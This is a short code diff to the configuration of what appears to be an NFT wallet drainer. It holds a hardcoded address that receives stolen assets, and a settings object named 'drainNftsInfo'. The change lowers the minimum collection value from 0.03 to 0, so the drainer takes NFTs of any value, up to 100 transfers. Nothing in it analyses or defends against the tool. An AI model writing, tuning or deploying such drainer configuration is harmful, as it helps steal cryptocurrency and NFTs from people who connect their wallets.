@@ -1,7 +1,7 @@
 const receiveAddress = "0x261A1f18d7681A1fe175b80229155ac690bACB5a";
 
 const drainNftsInfo = {
-    minValue: 0.03, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     maxTransfers: 100,
 }
 
